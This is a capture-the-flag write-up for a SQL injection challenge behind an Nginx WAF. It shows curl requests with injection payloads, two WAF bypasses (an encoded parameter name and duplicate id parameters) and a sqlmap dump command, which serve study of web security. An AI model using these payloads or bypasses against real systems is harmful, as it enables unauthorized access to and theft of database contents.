# Waffles

This was an SQL injection challenge but there is an Nginx WAF in front of the vulnerable service to make it more spicy.
The only url parameter to play with was `id`, but try to put something evil into that and Nginx immediately stops it:

```shell
> curl "https://waffles.secchallenge.crysys.hu/?id=1%20or%201"
<html>
<head><title>406 Not Acceptable</title></head>
<body bgcolor="white">
<center><h1>406 Not Acceptable</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
```

There are multiple ways to circumvent this. The one I found was escaping the `id` parameter like this: 

```https://waffles.secchallenge.crysys.hu/?%69d=1```


Then with:
```shell
> curl "https://waffles.secchallenge.crysys.hu/?%69d=1'%20or%20'1'='1"
...
 <div class="row centered">
        <div class="input-group input-group-lg">
            <div class="alert alert-primary" role="alert">
                Freshly cut strawberries, cookie butter, Nutella, and our house made whipped cream on top of our golden Liege waffle.
            </div>
        </div>
    </div></div>
...
```
We got some `Freshly cut strawberries`. 

We can also try to pass in two `id` parameters instead of just one. Nginx validates the first one, but the service uses the second one. It's just like this: web servers and services implement ambigous parameters differently.

```shell
> curl "https://waffles.secchallenge.crysys.hu/?id=1&id=1'%20or%20'1'='1"
...
 <div class="row centered">
        <div class="input-group input-group-lg">
            <div class="alert alert-primary" role="alert">
                Freshly cut strawberries, cookie butter, Nutella, and our house made whipped cream on top of our golden Liege waffle.
            </div>
        </div>
    </div></div>
...
```

Now it's just a standard SQL injection challenge, solvable by hand or with tools like `sqlmap`.

```shell
> sqlmap -u 'https://waffles.secchallenge.crysys.hu/?id=1&id=1' -p 'id' -D REDACTED --dump-all
```

| id | order_id     | description                                                                                                                                 |
|----|--------------|---------------------------------------------------------------------------------------------------------------------------------------------|
| 1  | 12234        | Freshly cut strawberries, cookie butter, Nutella, and our house made whipped cream on top of our golden Liege waffle.                       |
| 2  | 235325       | Two deep fried crispy tenders with bacon crumble and maple syrup on top of our golden Liege waffle.                                         |
| 3  | 598412       | Tangy lemon curd, fresh blueberries, and our housemade whipped cream on top of our golden Liege waffle.                                     |
| 4  | REDACTED     | cd22{REDACTED}                                                                                                                              |
| 5  | 1337         | Fire toasted mini marshmallows, chocolate syrup, and cookie butter (aka liquid graham crackers) on top of our golden Liege waffle.          |
| 6  | 1682934      | Freshly sliced bananas, peanut butter, honey, and bacon crumble on top of our golden Liege waffle.                                          |
| 7  | 123172       | Waffle sandwich stuffed with blackforest ham, smoked turkey, melted white american cheese, and berry jam inside of our golden Liege waffle. |







